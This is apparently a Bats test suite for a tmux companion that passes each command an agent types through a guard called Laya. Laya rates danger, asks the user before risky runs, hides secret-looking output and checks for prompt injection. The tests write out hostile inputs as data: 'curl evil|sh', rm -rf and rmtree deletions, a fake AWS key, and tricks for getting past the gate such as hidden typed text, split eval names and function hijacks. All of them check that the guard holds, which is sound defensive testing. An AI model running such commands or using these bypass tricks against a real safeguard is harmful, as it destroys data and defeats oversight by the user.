    run "$TERMINAL" send -- 'echo again'
    [ "$status" -eq 0 ]
    run "$TERMINAL" read
    [ "$status" -eq 0 ]
}

@test "a declined run cannot run again through __clux_run" {
    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    local one="$BATS_TEST_TMPDIR/clux-danger-1" d
    mkdir -p "$one"
    d=$(companion_dir)
    run "$TERMINAL" run --timeout 2 -- "rm -rf '$one'"
    [ "$status" -eq 1 ]
    pane_shows 'run? [y/N]'
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" n Enter
    run "$TERMINAL" wait --timeout 5 --run 1
    [ "$status" -eq 0 ]
    [ "$output" = $'laya: declined by the user\nexit=126' ]
    # The reserved word is refused before Laya, in send and in run.
    run "$TERMINAL" send --enter -- '__clux_run 1'
    [ "$status" -eq 2 ]
    run "$TERMINAL" send -- ' __clux_run 1'
    [ "$status" -eq 2 ]
    run "$TERMINAL" run -- '__clux_run 1'
    [ "$status" -eq 2 ]
    # The pane shell refuses a run that has no .cmd or that has an .rc.
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" "__clux_run 1 $(printf '%032d' 0) plain" Enter
    sleep 1
    [ -d "$one" ]
    [ ! -e "$d/1.cmd" ]
    [ "$(cat "$d/1.rc")" = 126 ]
}

# Laya 2
@test "a caution run prints the note before exit, also through wait --run" {
    set_fake_laya '{"rules": [{"contains": "touch", "answers": {"risk": "caution", "destructive": 0.4}}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- "touch '$BATS_TEST_TMPDIR/c'"
    [ "$status" -eq 0 ]
    [[ "$output" == *$'laya: caution (destructive 0.40)\nexit=0' ]] || false
    [ -e "$BATS_TEST_TMPDIR/c" ]
    run "$TERMINAL" run --timeout 1 -- "sleep 2; touch '$BATS_TEST_TMPDIR/d'"
    [ "$status" -eq 1 ]
    run "$TERMINAL" wait --timeout 10 --run 2
    [ "$status" -eq 0 ]
    [[ "$output" == *$'laya: caution (destructive 0.40)\nexit=0' ]] || false
}

# Laya 5
@test "run exits 6 and does not run the command when Laya stops" {
    "$TERMINAL" open >/dev/null
    stop_fake_laya
    run "$TERMINAL" run -- "touch '$BATS_TEST_TMPDIR/never'"
    [ "$status" -eq 6 ]
    [[ "$output" == *'laya not available: close and open the companion'* ]] || false
    [ ! -e "$BATS_TEST_TMPDIR/never" ]
    [ ! -d "$(companion_dir)/busy" ]
}

@test "send --key C-c stops a command when Laya stops" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- "sleep 2 && touch '$BATS_TEST_TMPDIR/never'" >/dev/null
    stop_fake_laya
    # Escape first: after C-c the clux prompt can come back, and Escape is
    # not permitted there.
    run "$TERMINAL" send --key Escape
    [ "$status" -eq 0 ] || { echo "$status $output"; false; }
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ]
    # Text still needs Laya. (At the clux prompt a key on a blank line needs
    # no request: there is no pane request there, and a blank line runs nothing.)
    run "$TERMINAL" send -- 'ls'
    [ "$status" -eq 6 ]
    sleep 3
    [ ! -e "$BATS_TEST_TMPDIR/never" ]
}

@test "each run command goes to Laya, also ls and echo" {
    "$TERMINAL" open >/dev/null
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" run -- 'ls'
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'echo hi'
    [ "$status" -eq 0 ]
    [ "$(fake_laya_states destructive)" = $'"ls"\n"echo hi"' ]
}

@test "run refuses a blank command with exit 2" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- '   '
    [ "$status" -eq 2 ]
    [ "$output" = 'run needs a command' ]
    [ ! -d "$(companion_dir)/busy" ]
}

@test "the pane shell does not expand an alias" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- "alias ls='touch $BATS_TEST_TMPDIR/alias'"
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'ls'
    [ "$status" -eq 0 ]
    [ ! -e "$BATS_TEST_TMPDIR/alias" ]
}

@test "C-d at the prompt does not end the pane shell" {
    "$TERMINAL" open >/dev/null
    local i
    for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
        "$TERMINAL" send --key C-d >/dev/null
    done
    sleep .5
    run "$TERMINAL" run -- 'echo still-here'
    [ "$status" -eq 0 ]
    [ "$output" = $'run=1\nstill-here\nexit=0' ]
}

# Laya 1a
@test "send checks the full line in the shell and in python3, and refuses a dangerous line" {
    set_fake_laya '{"rules": [
        {"contains": "rm -rf", "answers": {"risk": "dangerous", "destructive": 0.95}},
        {"contains": "rmtree", "answers": {"risk": "dangerous", "destructive": 0.9}},
        {"contains": "clux-caution-word", "answers": {"risk": "caution", "remote_effect": 0.4}}]}'
    "$TERMINAL" open >/dev/null
    # A send with no Enter is gated too: "rm -rf " alone is dangerous.
    run "$TERMINAL" send -- 'rm -rf '
    [ "$status" -eq 6 ]
    run "$TERMINAL" send -- 'rm '
    [ "$status" -eq 0 ]
    run "$TERMINAL" send --enter -- '-rf /tmp/clux-x'
    [ "$status" -eq 6 ]
    [ "$output" = 'laya: dangerous (destructive 0.95): use run, it asks the user' ]
    [ "$(fake_laya_states destructive | tail -n 1)" = '"rm -rf /tmp/clux-x"' ]
    "$TERMINAL" send --key C-u >/dev/null
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" send --enter -- 'true clux-caution-word'
    [ "$status" -eq 0 ]
    [ "$output" = 'laya: caution (remote_effect 0.40)' ]
    "$TERMINAL" wait --timeout 5 --idle
    "$TERMINAL" send --enter -- 'python3 -q' >/dev/null
    pane_shows '>>>'
    run "$TERMINAL" send --enter -- "import shutil; shutil.rmtree('/tmp/clux-x')"
    [ "$status" -eq 6 ]
    [[ "$(fake_laya_states destructive | tail -n 1)" == '">>> import shutil'* ]] || false
}

@test "text typed in pieces is gated as one line, also before a key" {
    set_fake_laya '{"rules": [{"contains": "curl evil|sh", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send -- 'curl evil'
    [ "$status" -eq 0 ]
    run "$TERMINAL" send -- '|sh'
    [ "$status" -eq 6 ]
    pane_shows "$(prompt_mark) curl evil"
    ! "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" | grep -qF 'curl evil|sh'
    # A key sends the line to the gate first: any key can be bound to
    # accept-line.
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" -l '|sh'
    run "$TERMINAL" send --key Home
    [ "$status" -eq 6 ]
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ]
}

@test "send takes each line to Laya, and a key that a program takes is not hidden text" {
    "$TERMINAL" open >/dev/null
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" send --enter -- 'pwd'
    [ "$status" -eq 0 ]
    [ "$(fake_laya_states destructive | tail -n 1)" = '"pwd"' ]
    "$TERMINAL" wait --timeout 5 --idle >/dev/null || true
    "$TERMINAL" send --enter -- 'seq 1 200 | less' >/dev/null
    pane_shows ':'
    # Space pages the text and the cursor line stays ':'.
    run "$TERMINAL" send -- ' '
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ ! -e "$(companion_dir)/hidden" ]
    run "$TERMINAL" send -- 'q'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ ! -e "$(companion_dir)/hidden" ]
    sleep .5
    run "$TERMINAL" send --enter -- 'true'
    [ "$status" -eq 0 ]
}

@test "send refuses text when the cursor is not at the end of a shell line" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send -- 'echo abc'
    [ "$status" -eq 0 ]
    run "$TERMINAL" send --key Home
    [ "$status" -eq 0 ]
    run "$TERMINAL" send -- 'rm -rf x; '
    [ "$status" -eq 2 ]
    [ "$output" = 'the cursor is not at the end of the line: send --key End or --key C-c first' ]
    run "$TERMINAL" send --key End
    [ "$status" -eq 0 ]
    run "$TERMINAL" send -- ' def'
    [ "$status" -eq 0 ]
}

@test "a blank line in a program goes to Laya with the screen above it" {
    set_fake_laya '{"rules": [{"contains": "Delete all resources", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- "printf 'Delete all %s? [Y/n]\\n' resources; read -r a; touch '$BATS_TEST_TMPDIR/accepted'" >/dev/null
    pane_shows 'Delete all resources? [Y/n]'
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 6 ]
    sleep .5
    [ ! -e "$BATS_TEST_TMPDIR/accepted" ]
    "$TERMINAL" send --key C-c >/dev/null
    # A blank line at the clux$ prompt needs no request.
    "$TERMINAL" wait --timeout 5 --idle
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 0 ]
    [ -z "$(fake_laya_states destructive)" ]
}

@test "the clux$ prompt after output with no last newline is still the prompt" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'printf foo'
    [ "$status" -eq 0 ]
    pane_shows "foo$(prompt_mark)"
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" send --enter -- 'echo hi'
    [ "$status" -eq 0 ]
    [ "$(fake_laya_states destructive | tail -n 1)" = '"echo hi"' ]
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" run -- 'printf foo'
    [ "$status" -eq 0 ]
    "$TERMINAL" send --enter -- 'stty -echo' >/dev/null
    "$TERMINAL" wait --timeout 5 --idle
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" -l 'printf foo'
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" Enter
    "$TERMINAL" wait --timeout 5 --idle
    pane_shows "foo$(prompt_mark)"
    # The echo check applies at this prompt too.
    run "$TERMINAL" send -- "touch '$BATS_TEST_TMPDIR/x'"
    [ "$status" -eq 3 ]
    "$TERMINAL" send --key C-c >/dev/null
}

@test "output that shows clux$ is not the prompt" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- "printf 'clux\$ '; sleep 3" >/dev/null
    pane_shows 'clux$ '
    run "$TERMINAL" wait --timeout 1 --idle
    [ "$status" -eq 1 ]
    run "$TERMINAL" wait --timeout 5 --idle
    [ "$status" -eq 0 ]
}

@test "a move key in a pager goes to the pane with no command request" {
    set_fake_laya '{"rules": [
        {"asks": "state", "contains": "(END)", "answers": {"state": "pager"}},
        {"asks": "state", "contains": ":", "answers": {"state": "pager"}},
        {"asks": "destructive", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" 'seq 1 200 | less' Enter
    pane_shows ':'
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" send --key PageDown
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key up
    [ "$status" -eq 0 ]
    [ -z "$(fake_laya_states destructive)" ]
    # Other keys still go to the gate.
    run "$TERMINAL" send --key Space
    [ "$status" -eq 6 ]
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" q
}

@test "an interrupt key works while a Laya question is open" {
    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    mkdir -p "$BATS_TEST_TMPDIR/clux-danger"
    run "$TERMINAL" run --timeout 2 -- "rm -rf '$BATS_TEST_TMPDIR/clux-danger'"
    [ "$status" -eq 1 ]
    pane_shows 'run? [y/N]'
    run "$TERMINAL" send -- 'y'
    [ "$status" -eq 3 ]
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ]
    run "$TERMINAL" wait --timeout 5 --run 1
    [ "$status" -eq 0 ]
    [ "$output" = $'laya: declined by the user\nexit=126' ]
    [ -d "$BATS_TEST_TMPDIR/clux-danger" ]
}

@test "send --key refuses text that is not a key name, also after stty -echo" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'stty -echo' >/dev/null
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" send --key "touch $BATS_TEST_TMPDIR/keytext"
    [ "$status" -eq 2 ]
    [ "$output" = "not a key name: touch $BATS_TEST_TMPDIR/keytext: send text with send -- TEXT" ]
    run "$TERMINAL" send --key a
    [ "$status" -eq 2 ]
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 0 ]
    sleep 1
    [ ! -e "$BATS_TEST_TMPDIR/keytext" ]
}

@test "text that the pane does not show stops send and run until C-c" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'stty -echo' >/dev/null
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" send -- "touch '$BATS_TEST_TMPDIR/hidden'"
    [ "$status" -eq 3 ]
    [ "$output" = 'text that the pane does not show is on the line: send --key C-c first' ]
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 3 ]
    run "$TERMINAL" send --enter -- 'true'
    [ "$status" -eq 3 ]
    run "$TERMINAL" run -- 'true'
    [ "$status" -eq 3 ]
    sleep 1
    [ ! -e "$BATS_TEST_TMPDIR/hidden" ]
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ]
    run "$TERMINAL" send --enter -- 'stty echo'
    [ "$status" -eq 0 ]
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" run -- 'echo back'
    [ "$status" -eq 0 ]
    [ ! -e "$BATS_TEST_TMPDIR/hidden" ]
}

# Laya 3
@test "run holds an AKIA line and keeps the lines around it" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'printf "a\nAKIAABCDEFGHIJKLMNOP\nb\n"'
    [ "$status" -eq 0 ]
    [ "$output" = $'run=1\na\n[held by laya: secret]\nb\nlaya: held 1 lines\nexit=0' ]
}

# Laya 4
@test "read and wait --pattern use the guarded text" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'echo visible-marker; echo two; echo three; echo AKIAABCDEFGHIJKLMNOP' >/dev/null
    run "$TERMINAL" wait --timeout 5 --pattern 'visible-marker'
    [ "$status" -eq 0 ]
    run "$TERMINAL" wait --timeout 2 --pattern 'AKIA[A-Z]{16}'
    [ "$status" -eq 1 ]
    run "$TERMINAL" read
    [ "$status" -eq 0 ]
    [[ "$output" == *'visible-marker'* ]] || false
    [[ "$output" == *'[held by laya: secret]'* ]] || false
    [[ "$output" != *'AKIAABCDEFGHIJKLMNOP'* ]] || false
}

@test "wait --pattern guards each new screen, also when the raw screen does not match" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'echo pattern-marker' >/dev/null
    "$TERMINAL" wait --timeout 5 --idle >/dev/null
    # Only the guard fails. A verb that tests the raw screen first never asks
    # the guard for a pattern that is not on the screen, and so its time and
    # exit tell what the raw screen holds.
    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
    run "$TERMINAL" wait --timeout 6 --pattern 'clux-no-match'
    [ "$status" -eq 6 ] || { echo "$status $output"; false; }
}

@test "wait --pattern goes on after one failed guard" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'echo pattern-marker' >/dev/null
    "$TERMINAL" wait --timeout 5 --idle >/dev/null
    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
    ( sleep 1.5; set_fake_laya '{}' ) 3>&- &
    local switch=$!
    run "$TERMINAL" wait --timeout 8 --pattern 'pattern-marker'
    wait "$switch"
    [ "$status" -eq 0 ] || { echo "$status $output"; false; }
}

@test "send and run take the typing lock, and take over the lock of a dead holder" {
    "$TERMINAL" open >/dev/null
    hold_lock "$(companion_dir)/typing"
    : > "$FAKE_LAYA_LOG"
    run "$TERMINAL" send -- 'echo x'
    [ "$status" -eq 5 ]
    [ "$output" = 'another send or run is typing in the pane: try again' ]
    run "$TERMINAL" run -- 'echo x'
    [ "$status" -eq 5 ]
    [ ! -d "$(companion_dir)/busy" ]
    [ -z "$(fake_laya_states destructive)" ]
    stop_holders
    run "$TERMINAL" run -- 'echo taken'
    [ "$status" -eq 0 ]
    [ "$output" = $'run=1\ntaken\nexit=0' ]
    [ ! -e "$(companion_dir)/typing" ]
}

@test "run holds all output and exits 6 when the guard fails, and wait --run gives it later" {
    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'echo guard-marker'
    [ "$status" -eq 6 ]
    [[ "$output" == *$'output held: laya not available: use wait --run 1 again\nexit=0'* ]] || false
    [[ "$output" == *'laya not available: the output stays; use wait --run 1 when Laya answers'* ]] || false
    [[ "$output" != *'close and open'* ]] || false
    [[ "$output" != *'guard-marker'* ]] || false
    # The run keeps the lock: no new run deletes the held output.
    [ -d "$(companion_dir)/busy" ]
    run "$TERMINAL" read
    [ "$status" -eq 6 ]
    run "$TERMINAL" run -- 'echo next'
    [ "$status" -eq 5 ]
    [ "$output" = 'the output of run 1 is held: use wait --run 1, or wait --run 1 --discard' ]
    set_fake_laya '{}'
    run "$TERMINAL" wait --run 1
    [ "$status" -eq 0 ]
    [ "$output" = $'guard-marker\nexit=0' ]
    [ ! -d "$(companion_dir)/busy" ]
    run "$TERMINAL" run -- 'echo next'
    [ "$status" -eq 0 ]
}

@test "wait --run N --discard drops held output that Laya cannot examine" {
    set_fake_laya '{"rules": [{"asks": "prompt_injection", "fail": 500}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'echo held-marker'
    [ "$status" -eq 6 ]
    run "$TERMINAL" run -- 'true'
    [ "$status" -eq 5 ]
    [ "$output" = 'the output of run 1 is held: use wait --run 1, or wait --run 1 --discard' ]
    run "$TERMINAL" wait --run 1 --discard
    [ "$status" -eq 0 ]
    [ "$output" = $'output discarded: laya did not examine it\nexit=0' ]
    [ ! -e "$(companion_dir)/1.out" ]
    run "$TERMINAL" wait --run 1 --discard
    [ "$status" -eq 2 ]
    run "$TERMINAL" wait --idle --discard
    [ "$status" -eq 2 ]
    set_fake_laya '{}'
    run "$TERMINAL" run -- 'echo next'
    [ "$status" -eq 0 ]
}

@test "run of one line longer than the guard limit says that nothing is shown" {
    "$TERMINAL" open >/dev/null
    run --separate-stderr "$TERMINAL" run -- "head -c 40000 /dev/zero | tr '\\0' x"
    [ "$status" -eq 0 ] || { echo "$status $output $stderr"; false; }
    [[ "$output" == *$'output cut: the last 32768 bytes are one line with no start: nothing is shown\n'* ]] || { echo "$output"; false; }
    [[ "$output" != *xxxx* ]] || false
    [[ "$output" == *'exit=0' ]] || { echo "$output"; false; }
}

@test "the guard removes NUL bytes and still finds the cut" {
    "$TERMINAL" open >/dev/null
    run --separate-stderr "$TERMINAL" run -- 'head -c 40000 /dev/zero; echo; echo nul-end'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'output cut: the last 32768 bytes, from the first full line\n'* ]] || false
    [[ "$output" == *$'nul-end\nexit=0' ]] || false
    [ -z "$stderr" ]
}

@test "wait --run on an older run does not free the lock of a run that continues" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'true'
    [ "$status" -eq 0 ]
    run "$TERMINAL" run --timeout 1 -- 'sleep 6'
    [ "$status" -eq 1 ]
    run "$TERMINAL" wait --timeout 2 --run 1
    [ "$status" -eq 0 ]
    [ -d "$(companion_dir)/busy" ]
    run "$TERMINAL" run -- 'echo late'
    [ "$status" -eq 5 ]
    run "$TERMINAL" wait --timeout 10 --run 2
    [ "$status" -eq 0 ]
}

@test "the guard gets at most the last 32768 bytes of the output" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'head -c 300000 /dev/zero | tr "\0" a; echo; echo last-line'
    [ "$status" -eq 0 ]
    [[ "$output" == *$'output cut: the last 32768 bytes, from the first full line\n'* ]] || false
    [[ "$output" == *$'last-line\nexit=0' ]] || false
    [ "${#output}" -lt 34000 ]
}

@test "laya status names the server of this companion" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" laya status
    [ "$status" -eq 0 ]
    [[ "$output" == *$'\nserver=external health=ok' ]] || false
    stop_fake_laya
    run "$TERMINAL" laya status
    [ "$status" -eq 0 ]
    [[ "$output" == *$'\nserver=external health=failed' ]] || false
}

@test "run refuses when text came on the prompt line while Laya examined the command" {
    set_fake_laya '{"rules": [{"contains": "clux-slow", "delay": 2}]}'
    "$TERMINAL" open >/dev/null
    local out="$BATS_TEST_TMPDIR/run.out" mark="$BATS_TEST_TMPDIR/typed" pid rc
    "$TERMINAL" run -- 'echo clux-slow' > "$out" 2>&1 3>&- &
    pid=$!
    sleep 1
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" -l "touch '$mark'"
    rc=0; wait "$pid" || rc=$?
    [ "$rc" -eq 5 ] || { cat "$out"; false; }
    [ "$(cat "$out")" = 'the pane is not at an empty prompt: use read, then run again' ]
    sleep .5
    [ ! -e "$mark" ]
    [ ! -e "$(companion_dir)/1.cmd" ]
    [ ! -d "$(companion_dir)/busy" ]
    # The user text stays on the line: run typed nothing after it.
    pane_shows "touch '$mark'"
    ! "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" | grep -q '__clux_run' || false
}

@test "C-c ends a run whose typed line the pane shell never read" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'true'
    [ "$status" -eq 0 ]
    local d
    d=$(companion_dir)
    # Run 2 as it is after a typed line that the shell did not read: the
    # question is open and the .cmd is still there.
    mkdir "$d/busy"; printf '2\n' > "$d/busy/owner"
    printf 'echo never' > "$d/2.cmd"; printf 'destructive 0.95\n' > "$d/2.reason"; : > "$d/2.confirm"
    sed -i.bak 's/^seq=.*/seq=2/' "$d/state" && rm -f "$d/state.bak"
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ ! -e "$d/2.cmd" ] && [ ! -e "$d/2.confirm" ]
    run "$TERMINAL" wait --timeout 5 --run 2
    [ "$status" -eq 0 ]
    [ "$output" = $'run 2 did not start: the typed line changed\nexit=126' ]
    run "$TERMINAL" run -- 'echo next'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [[ "$output" == *'next'* ]] || false
}

@test "wait --pattern does not match the held-by-laya marker" {
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'echo AKIAABCDEFGHIJKLMNOP' >/dev/null
    "$TERMINAL" wait --timeout 5 --idle >/dev/null
    run "$TERMINAL" read
    [[ "$output" == *'[held by laya: secret'* ]] || { echo "$output"; false; }
    run "$TERMINAL" wait --timeout 2 --pattern 'held'
    [ "$status" -eq 1 ]
    run "$TERMINAL" wait --timeout 2 --pattern 'laya'
    [ "$status" -eq 1 ]
}

@test "a function that a run makes does not change a later run" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- "eval 'cd() { echo HIJACKED; }'; export CLUX_T=1; cd /tmp"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" run -- 'cd /; pwd; echo "t=$CLUX_T"'
    [ "$status" -eq 0 ]
    [[ "$output" != *HIJACKED* ]] || false
    [[ "$output" == *$'\n/\nt=1\n'* ]] || { echo "$output"; false; }
}

@test "a line that send ends at the clux prompt runs in a subshell, also a split eval" {
    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send --enter -- "eval 'ls() { echo HIJACKED; }'"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle
    # A split name gets past each word rule: the line still runs in a
    # subshell, and __clux_run is read-only.
    run "$TERMINAL" send --enter -- 'a=__clu; e""val "${a}x_run"$'"'"'\x28\x29 { true; }'"'"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" send -- 'echo "open'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" run -- 'type ls | head -1'
    [[ "$output" != *function* ]] || { echo "$output"; false; }
    # A dangerous run still asks the user.
    run "$TERMINAL" run --timeout 2 -- 'true clux-danger'
    pane_shows 'run? [y/N]'
    "$TERMINAL" send --key C-c >/dev/null
}

@test "text right of the cursor does not join the __clux_line that send types" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send -- "true; trap 'echo TRAPPED' DEBUG"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Home
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Enter
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" run -- 'echo after'
    [[ "$output" == *$'\nafter\n'* ]] || { echo "$output"; false; }
    [[ "$output" != *TRAPPED* ]] || { echo "$output"; false; }
    run "$TERMINAL" read
    [[ "$output" != *refused* ]] || { echo "$output"; false; }
}

@test "at the clux prompt send refuses Escape and keys that do not edit the line" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send --key Escape
    [ "$status" -eq 2 ]
    [ "$output" = 'at the clux prompt, Escape is not permitted: use send --key C-c' ]
    run "$TERMINAL" send --key C-x
    [ "$status" -eq 2 ]
    [[ "$output" == 'at the clux prompt, only Enter and keys that edit the line work: C-x'* ]] || false
    # Tab (completion), Up (history) and C-a are not edit keys.
    for k in Tab Up C-a; do
        run "$TERMINAL" send --key "$k"
        [ "$status" -eq 2 ] || { echo "$k: $output"; false; }
    done
    run "$TERMINAL" send --key Home
    [ "$status" -eq 0 ] || { echo "$output"; false; }
}

@test "a send line gives back its directory and exported variables, and a background job keeps running" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send --enter -- 'cd /tmp; export CLUX_SENT=1; sleep 31.7 & echo started'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle
    run "$TERMINAL" run -- 'pwd; echo "s=$CLUX_SENT"; pgrep -f "sleep 31.7" >/dev/null && echo bg-alive'
    pkill -f 'sleep 31.7' || true
    [[ "$output" == *$'\n/tmp\ns=1\nbg-alive\n'* ]] || { echo "$output"; false; }
}
@test "send refuses text at a continuation line of the pane shell" {
    "$TERMINAL" open >/dev/null
    local mark
    mark=$(prompt_mark)
    # The user starts a command that is not complete.
    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" 'ls\' Enter
    pane_shows "${mark%$}>"
    run "$TERMINAL" send --enter -- '() { echo HIJACKED; }'
    [ "$status" -eq 5 ]
    [ "$output" = 'the pane shell waits for the rest of a command: send --key C-c, then send the full command on one line' ]
    run "$TERMINAL" send --key C-c
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'type ls | head -1'
    [[ "$output" != *function* ]] || false
}

@test "in a program, send checks the cursor and a dangerous line goes to the user" {
    set_fake_laya '{"rules": [{"contains": "clux-danger", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
    "$TERMINAL" open >/dev/null
    "$TERMINAL" send --enter -- 'python3 -q' >/dev/null
    pane_shows '>>>'
    run "$TERMINAL" send -- 'print(1)'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" send --key Left
    [ "$status" -eq 0 ]
    run "$TERMINAL" send -- 'x'
    [ "$status" -eq 2 ]
    [ "$output" = 'the cursor is not at the end of the line: send --key End or --key C-c first' ]
    "$TERMINAL" send --key C-c >/dev/null
    run "$TERMINAL" send --enter -- 'import os  # clux-danger'
    [ "$status" -eq 6 ]
    [ "$output" = 'laya: dangerous (destructive 0.95): ask the user to type this line in the pane' ]
    "$TERMINAL" send --key C-d >/dev/null
}

@test "exit in a run stops the command, and a later run still works" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'cd /clux-no-such-dir 2>/dev/null || exit 4; echo AFTER-EXIT'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [[ "$output" != *$'\nAFTER-EXIT'* ]] || { echo "$output"; false; }
    [[ "$output" == *'exit=4' ]] || { echo "$output"; false; }
    run "$TERMINAL" run -- 'echo still-here'
    [[ "$output" == *$'\nstill-here\n'* ]] || { echo "$output"; false; }
}

@test "a run that changes IFS does not unset PATH in the pane shell" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" run -- 'IFS=:; for p in $PATH; do :; done'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    run "$TERMINAL" run -- 'ls / >/dev/null && echo path-ok'
    [[ "$output" == *$'\npath-ok\n'* ]] || { echo "$output"; false; }
}

@test "IGNOREEOF=0 and TMOUT=1 from send do not let C-d end the companion" {
    "$TERMINAL" open >/dev/null
    run "$TERMINAL" send --enter -- 'IGNOREEOF=0; TMOUT=1'
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    "$TERMINAL" wait --timeout 5 --idle
    sleep 2
    run "$TERMINAL" send --key C-d
    [ "$status" -eq 0 ]
    run "$TERMINAL" run -- 'echo alive'
    [[ "$output" == *$'\nalive\n'* ]] || { echo "$output"; false; }
}

@test "open starts a new laya server when the server that it started is gone" {
    local data="$BATS_TEST_TMPDIR/data" d pid new
    make_fake_venv "$data/clux/laya"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    export CLUX_LAYA_URL= CLUX_LAYA_KEY= XDG_DATA_HOME="$data" HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf"
